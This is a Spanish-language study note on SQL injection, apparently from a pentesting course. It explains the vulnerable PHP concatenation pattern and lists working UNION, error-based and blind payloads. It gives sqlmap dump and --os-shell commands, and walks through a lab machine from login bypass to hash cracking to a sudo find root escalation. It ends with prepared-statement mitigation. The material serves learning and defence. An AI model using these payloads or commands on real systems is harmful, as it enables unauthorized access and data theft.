# SQL Injection (SQLi)

> [!danger] Vulnerabilidad crítica — OWASP Top 10: A03:2021 (Injection)
> SQLi permite inyectar código SQL malicioso en consultas concatenadas con datos del usuario, manipulando la lógica de la base de datos desde la aplicación web.

---

## ¿Qué es SQLi?

**SQL Injection (SQLi)** = inyectar código SQL en consultas que se concatenan con entrada del usuario sin sanitizar.

> [!important] La clave conceptual
> Lo vulnerable **no es el servidor**, ni el puerto, ni la base de datos, ni el frontend. **Lo vulnerable son los ficheros PHP** (u otra lógica server-side) que reciben input del usuario y lo concatenan directamente en una query SQL.

### Cómo funciona una aplicación web (capa vulnerable)

```
┌──────────┐     ┌──────────────┐     ┌──────────┐
│ Frontend │────▶│ PHP (app)    │────▶│ MySQL    │
│ (HTML/JS)│◀────│ ← VULNERABLE │◀────│ DB       │
└──────────┘     └──────────────┘     └──────────┘
```

El frontend envía datos al PHP. El PHP construye la consulta SQL. **Ahí es donde ocurre la inyección**: si el PHP concatena el input del usuario directamente en la query, el atacante controla la lógica SQL.

### El patrón vulnerable

```php
// ❌ CONCATENACIÓN DIRECTA — pattern vulnerable
$query = "SELECT * FROM users WHERE user='$u' AND pass='$p'";
$result = mysqli_query($con, $query);
```

Si el usuario introduce `admin' OR '1'='1' --` como valor de `$u`, la query se convierte en:

```sql
SELECT * FROM users WHERE user='admin' OR '1'='1' --' AND pass=''
							o
SELECT * FROM users WHERE user='admin' OR '1=1' --' AND pass=''
            dependera de como esta cofigurado
```

- `--` comenta el resto de la query (se ignora la verificación de password)
- `'1'='1'` siempre es `TRUE`
- **Resultado**: autenticación saltada sin password

---

## Técnicas de SQLi

### 1. UNION-based

Usa `UNION SELECT` para combinar resultados de otras tablas en la respuesta original.

```
' UNION SELECT 1,2,3,4-- 
' UNION SELECT null,table_name,null FROM information_schema.tables-- 
' UNION SELECT null,username,password FROM users-- 
```

> [!tip] Requisitos
> - Las columnas del UNION deben coincidir en número y tipo con la query original
> - Se usa para extraer datos directamente visibles en la página

### 2. Error-based

Fuerza errores SQL deliberados que revelan información en los mensajes de error.

```
' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))-- 
' AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)-- 
```

### 3. Blind SQLi

No hay output visible en la página. Se infiere la verdad por comportamiento.

#### Boolean-based

La respuesta cambia según si la condición es verdadera o falsa:

```
' AND 1=1-- → respuesta normal (TRUE)
' AND 1=2-- → respuesta diferente (FALSE)
' AND (SELECT LENGTH(password) FROM users WHERE user='admin')=8-- 
```

#### Time-based

La respuesta no cambia, pero el **tiempo de respuesta** sí:

```
' AND IF(1=1, SLEEP(5), 0)-- 
' AND IF((SELECT LENGTH(password) FROM users WHERE user='admin')=8, SLEEP(5), 0)-- 
```

> [!warning] Blind SQLi es lento
> Cada carácter se pregunta por separado. Con un password de 32 chars × 26 posiciones = hasta 832 requests. Por eso se usa automatización (SQLMap).

---

## SQLMap

> [!info] Referencia: [[comandos/SQLMap]]
> SQLMap automatiza la detección y explotación de SQLi.

```bash
# Detección básica
sqlmap -u "http://target/page.php?id=1" --dbs

# Con POST data
sqlmap -u "http://target/login.php" --data="user=admin&pass=test" --dbs

# Extraer tablas
sqlmap -u "http://target/page.php?id=1" -D base_de_datos --tables

# Extraer datos
sqlmap -u "http://target/page.php?id=1" -D base_de_datos -T usuarios --dump

# Shell remota
sqlmap -u "http://target/page.php?id=1" --os-shell
```

> [!warning] No uses SQLMap sin entender qué hace
> SQLMap genera mucho tráfico y puede dejar registros en logs. Úsalo con criterio.

---

## Machine "Injected" (HackerLab) — Caso práctico

> [!example] Cadena completa de explotación: SQLi → RCE → Root

### Paso 1: Enumeración web

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Se encuentra `backup.php` (o página con formulario de login vulnerable).

### Paso 2: SQLi — acceso sin credenciales

```
user: admin' OR '1'='1' -- 
pass: (cualquier cosa)
```

Se accede al panel. Se obtiene un hash MD5 de un usuario.

### Paso 3: Cracking del hash

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# Resultado: qwerty
```

### Paso 4: Escalada a RCE

Dentro de la aplicación se encuentra una funcionalidad que permite ejecutar comandos (o se explota una funcionalidad adicional). Se obtiene una reverse shell.

### Paso 5: Escalada de privilegios

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/find

sudo find . -exec /bin/sh -p \; -quit
# ROOT
```

> [!tip] Patrón habitual
> Web vulnerable → credenciales/hash → reverse shell → sudo/GTFOBins → root

---

## Conexión con otras vulnerabilidades

> [!note] Todas comparten la misma raíz: input del usuario en lógica server-side

| Vulnerabilidad | Mecanismo | Relación con SQLi |
|---------------|-----------|-------------------|
| **XXE** | Input XML procesado por el servidor | Mismo patrón: confiar en input externo |
| **Path Traversal** | Rutas concatenadas sin sanitizar | Mismo patrón: concatenar input en path |
| **LFI** | Ficheros incluidos por nombre del usuario | Mismo patrón: input del usuario controla qué se ejecuta |
| **Command Injection** | Comandos del SO concatenados con input | Evolución: de DB al SO directamente |

> [!danger] La cadena de explotación real
> En máquinas como Injected, la SQLi es la **puerta de entrada**. Una vez dentro, el patrón se repite: buscar funcionalidades que ejecuten código en el servidor → RCE → escalada.

---

## Mitigación (Blue Team)

### Prepared Statements (PDO) — La solución correcta

```php
// ✅ PREPARED STATEMENT — parámetros separados de la query
$stmt = $pdo->prepare("SELECT * FROM users WHERE user = :user AND pass = :pass");
$stmt->execute(['user' => $u, 'pass' => $p]);
```

> [!important] ¿Por qué funciona?
> Con prepared statements, **la query se compila primero** y los parámetros se pasan después. El motor SQL distingue entre código (la query) y datos (el input). Nunca se interpretan los datos como instrucciones SQL.

### Otras mitigaciones

| Medida | Descripción |
|--------|-------------|
| **Prepared statements** | PDO / mysqli_prepare — la solución primaria |
| **Input validation** | Whitelist de caracteres permitidos |
| **Least privilege** | El usuario de BD solo tiene los permisos necesarios |
| **WAF** | Web Application Firewall como capa adicional |
| **Error handling** | No mostrar errores SQL al usuario |
| **SQLMap detection** | Monitorear patrones de requests automatizados |

> [!quote] Andrés — 14.07.2026
> "Lo vulnerable no es el servidor, ni el puerto, ni la base de datos, ni el front. Lo vulnerable son los ficheros PHP."

---

## Checklist de repaso

- [ ] Identifico inputs del usuario que se concatenan en queries SQL
- [ ] Distingo entre UNION, error-based y blind SQLi
- [ ] Sé usar SQLMap para automatizar la explotación
- [ ] Conozco la cadena completa: SQLi → hash → RCE → root
- [ ] Entiendo que prepared statements eliminan la vulnerabilidad
- [ ] Conozco la conexión entre SQLi, XXE, Path Traversal y LFI
- [ ] Recuerdo: el vulnerable es el PHP, no la DB ni el servidor

---

## Tags

#web #sqli #owasp #injection #prepared-statements #sqlmap #blue-team

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Joselu/MODULO3/resumen_master_clase43.md|resumen_master_clase43]]— Escalada de Privilegios, Redes, XXE
- [[../../apuntes Andres/14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab).md|14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab)]]— Escalada de Privilegios, Redes, XXE
- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]]— Escalada de Privilegios, Redes, SQL Injection
- [[../../apuntes Chema/OWASP Top 10, CVSS, CWE y CVE.md|OWASP Top 10, CVSS, CWE y CVE]]— Escalada de Privilegios, Redes, XXE
- [[../../transcripciones/Julio/14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab).md|14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab)]]— Escalada de Privilegios, Redes, XXE
- [[../../transcripciones/Julio/10.07.2026 Repaso y Explotación Avanzada Máquinas Nike y Castor.md|10.07.2026 Repaso y Explotación Avanzada Máquinas Nike y Castor]]— Escalada de Privilegios, Redes, XXE

### 🛠️ Herramientas

- [[comandos/Netcat|Netcat / Reverse Shells]]
- [[comandos/SQLMap|SQLMap]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #blue-team #command-injection #escalada-privilegios #lfi #linux #netcat #redes #reverse-shell #sqli #sqlmap #xxe
